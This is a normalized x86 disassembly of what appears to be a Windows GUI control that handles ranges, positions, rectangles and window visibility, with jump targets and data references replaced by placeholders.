jmp r-xdata
cmp eax [ esi + 0xb8 ]
jbe r-xdata
cmp [ esi + 0x2a ] 0x0
mov eax ecx
cdq
mov [ esi + 0xa8 ] eax
mov [ esi + 0xac ] edx
je r-xdata
mov eax ecx
cdq
mov [ esi + 0xa0 ] eax
mov [ esi + 0xa4 ] edx
mov ecx [ esi + 0xb0 ]
cmp eax [ esi + 0xb0 ]
jae r-xdata
mov eax esi
call sub_426dd0
sub_4351f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push edi
cmp eax [ esi + 0x38 ]
jl r-xdata
sub eax [ esi + 0x84 ]
test eax eax
jle r-xdata
mov eax [ esi + 0xb8 ]
pop edi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0xb0 ]
pop edi
pop ebx
pop ebp
retn 0x8
mov ecx [ esi + 0xb8 ]
sub ecx [ esi + 0xb0 ]
mov edi [ esi + 0xbc ]
mov ebx [ esi + 0xb4 ]
mov edx edi
sbb edx ebx
mov [ ebp + 0xc ] edx
cdq
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
call sub_444a60
mov [ ebp + 0x8 ] eax
mov eax [ esi + 0x8c ]
sub eax [ esi + 0x84 ]
mov [ ebp + 0xc ] edx
fild [ ebp + 0x8 ]
mov [ ebp + 0xc ] eax
fild [ ebp + 0xc ]
fdivp st1
fadd [ r--data ]
call sub_4449b0
mov ecx eax
cdq
cmp edx edi
jl r-xdata
cmp edx ebx
jg r-xdata
jg r-xdata
pop edi
mov eax ecx
pop ebx
pop ebp
retn 0x8
jl r-xdata
cmp eax [ esi + 0xb8 ]
ja r-xdata
cmp eax [ esi + 0xb0 ]
jae r-xdata
sub_4352a0
push ebp
mov ebp esp
and esp 0xfffffff8
push esi
mov esi ecx
cmp [ esi + 0xd9 ] 0x0
push edi
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_4351f0
cdq
cmp eax [ esi + 0xa0 ]
jne r-xdata
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ esi + 0xc3 ] 0x0
mov [ esi + 0xa0 ] eax
mov [ esi + 0xa4 ] edx
jne r-xdata
cmp edx [ esi + 0xa4 ]
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov ecx [ esi + 0xbc ]
mov edx eax
mov eax [ esi + 0xa4 ]
mov [ esi + 0xa8 ] edx
mov edi edx
mov edx [ esi + 0xb8 ]
mov [ esi + 0xac ] eax
cmp eax ecx
jl r-xdata
call sub_435430
mov eax [ esi ]
mov edx [ eax + 0xa8 ]
mov ecx esi
call edx
pop edi
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov ecx [ esi + 0xb4 ]
mov edx [ esi + 0xb0 ]
cmp eax ecx
jg r-xdata
jg r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
jl r-xdata
mov [ esi + 0xac ] ecx
mov [ esi + 0xa8 ] edx
cmp edi edx
ja r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
cmp edi edx
jae r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_4353a0
push ebp
mov ebp esp
push ebx
mov bl [ ebp + 0x8 ]
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x27 ] bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov [ esi + 0xd9 ] 0x1
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_435400
mov eax ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
retn
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push esi
mov esi [ eax + 0xa0 ]
push esi
mov esi [ eax + 0x8 ]
push esi
push 0x500
push eax
mov eax [ edx + 0x10 ]
call eax
pop esi
sub_435430
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b638
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
cmp [ esi + 0xe4 ] 0x0
je r-xdata
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xe8 ]
sub eax 0x10
call sub_4025f0
lea ebx [ eax + 0x10 ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x20 ] 0x1
mov eax [ esi + 0xe8 ]
cmp [ eax - 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0xa4 ]
mov eax [ esi + 0xa0 ]
mov edi [ esi + 0x4 ]
push edx
push eax
push ebx
add edi 0x68
call sub_401dc0
add esp 0xc
mov [ esp + 0x20 ] 0xffffffff
lea eax [ ebx - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push r--data
lea ecx [ esp + 0x14 ]
push ecx
mov ebx 0x3
call sub_402910
mov ebx [ esp + 0x10 ]
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_435510
push ebp
mov ebp esp
push 0xffffffff
push sub_448508
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_434040
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0xc ] 0x29
mov [ esi + 0xa8 ] eax
mov [ esi + 0xac ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_435580
push ebp
mov ebp esp
push 0xffffffff
push sub_446998
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_4341f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4355f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
mov [ esp + 0x10 ] eax
lea ecx [ esi + 0xb0 ]
lea ebx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x0
call sub_414260
mov eax [ esp + 0x18 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
mov ecx [ esp + 0x3c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov esi [ eax + 0x10 ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
mov edx [ edi + 0x7c ]
mov [ esp + 0x24 ] eax
mov eax [ edi + 0x74 ]
mov [ esp + 0x2c ] eax
mov eax [ edi + 0x80 ]
sub eax ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov ebx [ edi + 0x78 ]
sub eax ebx
mov [ esp + 0x34 ] edx
cdq
sub eax edx
mov [ esp + 0x28 ] ecx
sar eax 0x1
add ebx eax
add ecx ebx
mov [ esp + 0x38 ] ecx
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x34 ]
push edx
mov [ esp + 0x3c ] ebx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
sub_4356c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x98 ]
cmp [ ecx + 0xf9 ] 0x0
push edi
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ esp + 0x3c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x1
call sub_414260
mov eax [ esp + 0x18 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ebx [ eax + 0x10 ]
xor edx edx
cmp ebx edx
je r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x30 ]
mov edi [ esi + 0x3c ]
mov [ esp + 0x30 ] eax
mov eax [ esi + 0x38 ]
mov [ esp + 0x34 ] eax
sub eax ecx
mov [ esp + 0x2c ] ecx
mov ecx [ esi + 0xac ]
push ecx
mov ecx [ esi + 0xa8 ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] edx
cdq
push ecx
push edx
push eax
mov [ esp + 0x48 ] edi
call sub_444a60
mov ecx [ esi + 0xb8 ]
sub ecx [ esi + 0xb0 ]
mov edi [ esi + 0xbc ]
sbb edi [ esi + 0xb4 ]
push edi
push ecx
push edx
push eax
call sub_444ad0
mov edx [ ebx ]
mov edx [ edx + 0xc ]
mov esi eax
mov eax [ ebx + 0x14 ]
push eax
mov ecx ebx
call edx
mov edx [ ebx + 0xc ]
mov edi [ ebx + 0x10 ]
xor eax eax
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x2c ]
xor ecx ecx
add eax esi
push ecx
mov [ esp + 0x38 ] eax
mov [ esp + 0x24 ] ecx
lea eax [ esp + 0x20 ]
push eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x2c ] edx
lea ecx [ esp + 0x34 ]
mov [ esp + 0x30 ] edi
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
push ecx
push eax
mov ecx ebx
call edx
sub_435800
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x98 ]
cmp [ ecx + 0xf9 ] 0x0
mov [ esp + 0x18 ] edi
mov [ esp + 0x30 ] eax
je r-xdata
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov esi [ edi + 0x4 ]
lea ecx [ esi + 0xb0 ]
lea ebx [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] 0x1
call sub_414260
mov eax [ esp + 0x14 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
mov esi [ eax + 0x10 ]
xor edx edx
cmp esi edx
je r-xdata
mov eax [ edi + 0x34 ]
mov ecx [ edi + 0x30 ]
mov ebx [ edi + 0x3c ]
mov [ esp + 0x20 ] eax
mov eax [ edi + 0x38 ]
mov [ esp + 0x24 ] eax
sub eax ecx
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] edx
mov [ esp + 0x3c ] edx
mov [ esp + 0x40 ] edx
mov [ esp + 0x2c ] eax
cdq
push edx
mov edx [ edi + 0xac ]
mov [ esp + 0x2c ] ebx
mov ebx [ edi + 0xb8 ]
sub ebx [ edi + 0xb0 ]
mov [ esp + 0x20 ] ecx
mov ecx [ edi + 0xbc ]
sbb ecx [ edi + 0xb4 ]
push eax
mov eax [ edi + 0xa8 ]
push edx
push eax
mov [ esp + 0x24 ] ecx
call sub_444a60
mov ecx [ esp + 0x14 ]
push ecx
push ebx
push edx
push eax
call sub_444ad0
mov edx [ esi ]
mov edx [ edx + 0xc ]
mov ebx eax
mov eax [ esi + 0x14 ]
push eax
mov ecx esi
call edx
mov eax [ esi + 0xc ]
cdq
and edx 0x3
lea edi [ edx + eax ]
sar edi 0x2
mov eax edi
cdq
sub eax edx
sar eax 0x1
sub ebx eax
mov [ esp + 0x10 ] ebx
jns r-xdata
xor ebx ebx
xor ebx ebx
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov eax [ esp + 0x18 ]
cmp [ eax + 0x27 ] 0x0
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
jne r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x2c ]
sub eax edi
cmp [ esp + 0x10 ] eax
jle r-xdata
cmp [ eax + 0xc0 ] 0x0
je r-xdata
lea ebx [ edi + edi * 2 ]
jmp r-xdata
cmp [ eax + 0xc1 ] 0x0
je r-xdata
lea ebx [ edi + edi ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0x10 ]
push eax
lea ecx [ ebx + edi ]
push ecx
push 0x0
push ebx
lea edx [ esp + 0x54 ]
push edx
call [ SetRect@IAT ]
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
mov ebx [ esp + 0x20 ]
mov [ esp + 0x34 ] eax
add eax [ esp + 0x10 ]
mov [ esp + 0x3c ] ecx
mov [ esp + 0x34 ] eax
add eax edi
mov [ esp + 0x40 ] edx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] eax
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov edi [ esp + 0x28 ]
mov eax edi
sub eax ebx
cmp [ esi + 0x10 ] eax
jge r-xdata
mov ebx edi
mov eax [ esp + 0x40 ]
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov ecx [ esp + 0x38 ]
mov eax edi
sub eax [ esi + 0x10 ]
sub eax ebx
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax [ esp + 0x50 ]
sub eax [ esp + 0x48 ]
mov [ esp + 0x38 ] ecx
add eax ecx
mov [ esp + 0x40 ] eax
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x34 ]
mov [ ecx + 0xc8 ] edx
mov edx [ esp + 0x38 ]
mov [ ecx + 0xcc ] edx
mov edx [ esp + 0x3c ]
mov [ ecx + 0xd0 ] edx
mov [ ecx + 0xd4 ] eax
mov eax [ esi ]
push 0x1
lea ecx [ esp + 0x48 ]
push ecx
mov ecx [ esp + 0x38 ]
lea edx [ esp + 0x3c ]
push edx
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
sub_435a60
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea edx [ esi + 0xc8 ]
push edx
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edi [ GetTickCount@IAT ]
call edi
sub eax [ rw-data ]
cmp eax 0x1388
jbe r-xdata
call edi
mov ecx [ esi + 0x1c ]
mov [ rw-data ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x3c ]
push esi
call edx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x6c ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
movzx eax [ ebp + 0xc ]
movzx esi [ ebp + 0x8 ]
mov edx [ ecx ]
mov edx [ edx + 0x38 ]
push 0x1
shl eax 0x10
or eax esi
push eax
push 0x0
push 0x200
call edx
sub_435b00
push ebp
mov ebp esp
push 0xffffffff
push sub_448f2c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_434040
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea eax [ esi + 0xf4 ]
push eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
call sub_43fa70
mov [ ebp - 0x4 ] 0x1
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
lea edi [ esi + 0x17c ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call eax
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x188 ] ebx
mov [ esi + 0x18c ] ebx
or eax 0xffffffff
mov [ esi + 0xc ] 0x2b
mov [ esi + 0xf0 ] ebx
mov [ esi + 0x180 ] ebx
mov [ esi + 0x184 ] ebx
mov [ esi + 0x190 ] ebx
mov [ esi + 0x194 ] bl
mov [ esi + 0x198 ] ebx
mov [ esi + 0x1a0 ] eax
mov [ esi + 0x1a4 ] eax
mov [ esi + 0x1a8 ] eax
mov [ esi + 0x1ac ] eax
mov [ esi + 0x1b0 ] eax
mov [ esi + 0x1b4 ] eax
mov [ esi + 0x1b8 ] eax
mov [ esi + 0x1bc ] eax
mov [ esi + 0x1c0 ] eax
mov [ esi + 0x1c4 ] eax
mov [ esi + 0x27 ] bl
mov [ esi + 0xc2 ] bl
mov [ esi + 0x1c8 ] 0x1
mov [ ebp - 0x4 ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_435c20
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_435c50
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_435c50
push ebp
mov ebp esp
push 0xffffffff
push sub_448ed6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ edi + 0x70 ] r--data
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
lea eax [ edi + 0x17c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0xf4 ]
lea ecx [ esi + 0x24 ]
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x5
mov [ esi + 0x7c ] r--data
mov [ ebp - 0x4 ] 0x4
call sub_41a460
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx edi
call sub_4341f0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_435d30
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
mov esi ecx
call sub_40e4c0
mov [ esi + 0x98 ] edi
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0xc ]
lea eax [ ebp + 0x8 ]
mov [ ebp + 0xc ] 0x0
call sub_414260
mov eax [ ebp + 0x8 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0xc ]
lea eax [ ebp + 0x8 ]
mov [ ebp + 0xc ] 0x0
call sub_414260
mov eax [ ebp + 0x8 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov edi [ eax + 0x10 ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0xc ]
lea eax [ ebp + 0x8 ]
mov [ ebp + 0xc ] 0x2
call sub_414260
mov eax [ ebp + 0x8 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
sub eax edx
sar eax 0x1
mov [ esi + 0x94 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebx ]
mov edx [ eax + 0xc ]
push ecx
mov ecx ebx
call edx
mov ebx [ ebx + 0xc ]
mov eax 0x55555556
imul ebx
mov eax edx
shr eax 0x1f
add eax edx
mov [ esi + 0x94 ] eax
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0xc ]
mov [ esi + 0x180 ] eax
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x184 ] eax
sub_435e50
push esi
push edi
mov esi ecx
mov ecx [ esi - 0x54 ]
lea edi [ esi - 0x70 ]
push edi
push 0x2a3
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x20
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x200
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x201
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x202
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x20a
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x113
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x46
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x204
call sub_412fd0
pop edi
pop esi
retn
sub_435ee0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x25 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ esi + 0x27 ] 0x0
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
test al al
je r-xdata
xor al al
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
jne r-xdata
mov al 0x1
mov [ esi + 0x25 ] al
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x70 ]
call edx
sub_435f50
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
xor edx edx
mov [ ecx + 0x24 ] al
cmp al dl
jne r-xdata
pop ebp
retn 0x4
mov [ ecx + 0x29 ] dx
mov ecx [ ecx + 0xf8 ]
cmp ecx edx
je r-xdata
push edx
push ecx
call [ ShowWindow@IAT ]
sub_435f80
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push edi
mov edi ecx
mov [ edi + 0x28 ] al
test al al
je r-xdata
mov [ edi + 0x29 ] 0x101
pop edi
pop ebp
retn 0x4
mov eax [ edi + 0x4 ]
mov [ edi + 0x29 ] 0x0
test eax eax
je r-xdata
mov edi [ edi + 0xf8 ]
test edi edi
je r-xdata
push esi
lea esi [ eax + 0x6c ]
call sub_4028b0
mov eax [ edi + 0x4 ]
call sub_4142d0
pop esi
pop edi
pop ebp
retn 0x4
push 0x0
push edi
call [ ShowWindow@IAT ]
sub_435fe0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x98 ]
push edi
call edx
mov eax [ esi ]
mov edx [ eax + 0x9c ]
push edi
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0xa0 ]
push edi
mov ecx esi
call edx
push edi
mov ecx esi
call sub_4363b0
pop edi
pop esi
pop ebp
retn 0x4
sub_436020
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x7c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0xf0 ]
mov ecx [ ebp + 0x8 ]
push edi
mov [ esp + 0x4c ] esi
mov [ esp + 0x28 ] ecx
test eax eax
jle r-xdata
push ecx
mov ecx esi
call sub_4347e0
cmp eax 0x64
jg r-xdata
mov ecx [ esi + 0x4 ]
mov edi [ esi + 0x98 ]
lea ecx [ ecx + 0xb0 ]
lea ebx [ esp + 0x10 ]
lea eax [ esp + 0x24 ]
mov [ esp + 0x60 ] edi
mov [ esp + 0x10 ] 0x0
call sub_414260
mov ecx [ esp + 0x24 ]
mov eax [ esi + 0x4 ]
cmp ecx [ eax + 0xb4 ]
je r-xdata
mov ecx [ esp + 0x84 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ecx + 0x10 ]
xor eax eax
cmp ebx eax
je r-xdata
cmp [ edi + 0xf8 ] al
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esi + 0x78 ]
mov ecx [ esi + 0x74 ]
mov [ esp + 0x18 ] edx
mov edx [ esi + 0x80 ]
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] eax
mov [ esp + 0x7c ] eax
mov [ esp + 0x80 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
mov al [ edi + 0xa9 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x7c ]
mov [ esp + 0x20 ] edx
mov edx [ ebx ]
mov edx [ edx + 0xc ]
mov [ esp + 0x10 ] al
mov eax [ ebx + 0x14 ]
mov [ esp + 0x1c ] ecx
push eax
mov ecx ebx
call edx
mov eax 0x55555556
imul [ ebx + 0xc ]
mov edi edx
shr edi 0x1f
lea eax [ esp + 0x2c ]
add edi edx
push eax
mov eax [ esp + 0x64 ]
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x54 ]
add edi edi
call sub_413b10
mov edx [ esp + 0x2c ]
mov ecx [ esp + 0x34 ]
lea eax [ edx + edi ]
sub ecx edx
lea edx [ ecx + eax ]
mov [ esp + 0x7c ] edx
mov edx [ esp + 0x38 ]
mov [ esp + 0x80 ] edx
mov edx [ esp + 0x1c ]
sub edx [ esp + 0x14 ]
mov [ esp + 0x74 ] eax
imul edx [ esi + 0xf0 ]
mov eax [ esp + 0x30 ]
mov [ esp + 0x78 ] eax
mov eax 0x51eb851f
imul edx
mov eax [ esp + 0x14 ]
sar edx 0x5
mov esi edx
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x1c ]
shr esi 0x1f
add esi edx
mov edx [ esp + 0x18 ]
mov [ esp + 0x6c ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x68 ] edx
mov [ esp + 0x70 ] eax
cmp esi ecx
jge r-xdata
mov eax [ esp + 0x14 ]
add eax ecx
mov [ esp + 0x6c ] eax
mov ecx [ esp + 0x14 ]
add ecx esi
mov [ esp + 0x6c ] ecx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ebx ]
mov eax [ eax + 0x14 ]
push ecx
lea edx [ esp + 0x78 ]
push edx
mov edx [ esp + 0x30 ]
lea ecx [ esp + 0x6c ]
push ecx
push edx
mov ecx ebx
call eax
cmp esi [ esp + 0x24 ]
jle r-xdata
sub eax ecx
add eax [ esp + 0x30 ]
cdq
sub eax edx
mov edx eax
mov eax [ esp + 0x68 ]
sar edx 0x1
add eax edx
mov [ esp + 0x68 ] eax
sub eax [ esp + 0x30 ]
add eax ecx
mov [ esp + 0x70 ] eax
mov ecx [ esp + 0x38 ]
mov eax edx
sub eax [ esp + 0x30 ]
